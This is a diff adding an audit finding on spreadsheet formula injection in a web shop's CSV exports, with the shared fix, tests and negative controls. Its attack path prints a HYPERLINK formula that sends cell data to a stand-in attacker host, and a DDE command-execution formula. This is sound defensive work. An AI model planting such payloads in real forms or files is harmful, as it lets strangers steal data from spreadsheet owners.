@@ -1021,6 +1021,134 @@ write path exists, and consolidation should make sure only one block acts on it.
 
 ---
 
+## I-08 — Four of eight CSV escapers let an anonymous stranger put a live formula in the owner's spreadsheet
+
+**Grade:** `BEHAVIORAL-TEST-PROVEN` · **Severity:** P1 · **Status:** FIXED
+
+### The divergence
+
+Eight separate CSV cell escapers exist. Four neutralise spreadsheet formula
+injection; four only quote.
+
+| escaper | formula guard |
+|---|---|
+| `api/admin/orders/export/route.ts:7` `csvEscape` | ✅ |
+| `lib/admin-customers.ts:160` `csvEscape` | ✅ |
+| `lib/admin-membership.ts:697` `csvEscape` | ✅ |
+| `lib/inventory-ledger.ts:180` `csvCell` | ✅ (and already exported) |
+| `api/admin/partners/export-payouts/route.ts:6` `escapeCsv` | ❌ |
+| `api/admin/partners/export-payout-history/route.ts:6` `escapeCsv` | ❌ |
+| `api/admin/tax/export/route.ts:6` `csvEscape` | ❌ |
+| `lib/admin-products-csv.ts:24` `csvEscape` | ❌ |
+
+The guarded four state the reason (`admin-customers.ts:162-164`):
+
+> *"Neutralize spreadsheet formula injection from attacker-controlled cells
+> (customer name/email) — a leading `= + - @` / tab / CR would run as a formula
+> in Excel/Sheets. Prefix a single quote."*
+
+So the hazard is understood here. It just was not applied everywhere — the same
+shape as I-03 (three IP resolvers) and I-05 (three image sniffers). This is the
+third instance of one correct implementation and several weaker copies, and it
+is the pattern worth naming for the final report.
+
+### Why quoting is not the defence
+
+The unguarded four wrap every value in double quotes:
+
+```ts
+function escapeCsv(value: string) {
+  return `"${value.replace(/"/g, '""')}"`;
+}
+```
+
+Quoting fixes **delimiter** injection — a comma or newline breaking the row
+apart. Formula injection is a different bug: Excel and Sheets strip the
+surrounding quotes while parsing the field and *then* evaluate a leading `=`.
+The two look similar and only one is fixed by quoting.
+
+### Why the partner exports are the serious pair
+
+`export-payouts` writes `row.name`, `row.email` and `row.referralCode`;
+`export-payout-history` writes `row.ambassadorName` and the note.
+
+A partner's name, email and referral code come from the **public ambassador
+application form**. They are unauthenticated, externally supplied text. So the
+path is:
+
+1. A stranger submits an application with the name
+   `=HYPERLINK("http://evil.test/?d="&A1,"You won")`. No account needed.
+2. The owner exports payouts — a routine, recurring task — and opens the CSV in
+   Excel.
+3. The formula runs with the owner's spreadsheet privileges, on a sheet holding
+   every ambassador's commissions and payout handles. `HYPERLINK` exfiltrates a
+   neighbouring cell to an external host on one click; `=cmd|'/c calc'!A1` is
+   the DDE variant.
+
+`tax/export` and `admin-products-csv` carry operator-supplied text, so they are
+lower risk — fixed at the same time because the guard costs nothing and leaving
+two of eight unguarded just re-creates the divergence.
+
+### Fix applied
+
+New `src/lib/csv-safe.ts` exports `csvSafeCell`, adopted by all four unguarded
+sites. Their local escapers are deleted, so eight implementations become five,
+and the four that were already correct are unchanged.
+
+`csvSafeCell` is **byte-for-byte identical** to the four that already got this
+right — a test asserts that against a reference implementation across a sample
+of inputs — so adopting it changes no existing export's output. The guard is
+applied *before* the quoting decision, so the apostrophe lands inside the
+quotes where the spreadsheet will see it.
+
+### Reproduction and verification
+
+`src/lib/csv-formula-injection.test.ts` drives the **real** export handlers with
+a hostile partner name and asserts on the CSV text, using an
+`injectableCells()` helper that models what a spreadsheet does: strip the
+optional surrounding quotes, then check whether the cell still begins with a
+formula character.
+
+Before — red for the right reason, live formula cells in both exports:
+
+```
+× export-payouts neutralises a hostile partner name and referral code
+× export-payout-history neutralises a hostile ambassador name and note
+    AssertionError: expected [ …(2) ] to deeply equal []
+   Tests  2 failed | 1 passed (3)
+```
+
+After: **15 passed (15)**. Full suite **210 files / 3643 tests passed**, 1 file
+/ 7 skipped, zero regressions. `tsc --noEmit` clean, eslint clean.
+
+### Negative controls
+
+| # | Mutation | Result |
+|---|---|---|
+| C1 | Drop the formula guard (back to quoting only) | 11 failed |
+| C2 | Guard only `=`, miss `+ - @` tab CR | 8 failed |
+| C3 | Apply the guard *after* quoting (apostrophe outside the quotes) | 1 failed |
+| C4 | Stop escaping embedded quotes | 3 failed |
+
+**C3 is worth a note on method.** On the first run it reported 15/15 passed —
+apparently uncaught. It was not: my mutation script's string replacement had
+silently failed to match, so nothing was mutated and the suite passed on the
+unmodified fix. Re-applied with an assertion that the anchor exists, C3 is
+caught (1 failed, the "quotes AND guards when a cell needs both" case).
+
+**A mutation that fails to apply is indistinguishable from a mutation that is
+not caught, and it reads as the reassuring one.** Every negative control in this
+block that reported "not caught" (I-01's M4, I-05's P7) was re-checked for this;
+both were genuine gaps and both were closed. Worth carrying into Block E, whose
+whole job is mutation testing.
+
+**CROSS-BLOCK:** `lib/inventory-ledger.ts` (Block D) and
+`lib/admin-customers.ts` / `lib/admin-membership.ts` still hold their own
+correct copies. Collapsing those into `csvSafeCell` is a tidy-up for
+consolidation, not a defect — they are not wrong, only duplicated.
+
+---
+
 ## Status
 
 | Id | Severity | Evidence | Fixed |
@@ -1033,6 +1161,7 @@ write path exists, and consolidation should make sure only one block acts on it.
 | I-05b | — | `SOURCE-INSPECTED` | **PASS** — customer-facing proof upload already correct |
 | I-06 | P3 | `DATABASE-PROVEN` | No — owner decision (accept GIFs or not) |
 | **I-07** | **P0** | `DATABASE-PROVEN` | **No — revoke written, blocked on owner (Rule 4)** |
+| I-08 | P1 | `BEHAVIORAL-TEST-PROVEN` | **Fixed & tested** |
 
 I-01, I-03, I-04 and I-05 are proven and fixed, each with negative controls
 recorded above. I-02 is corrected and recorded as a latent risk with no code
@@ -1044,7 +1173,7 @@ already exposes by design). Both corrections are kept in the record rather than
 quietly rewritten, because a reader needs to know which claims were checked
 hard enough to break.
 
-Full suite after I-04: **208 files / 3628 tests passed**, 1 file / 7 tests
+Full suite after I-08: **210 files / 3643 tests passed**, 1 file / 7 tests
 skipped, zero regressions. `tsc --noEmit` clean, eslint clean.
 
 **CROSS-BLOCK:** `src/app/api/catalog/back-in-stock/route.ts` sits under
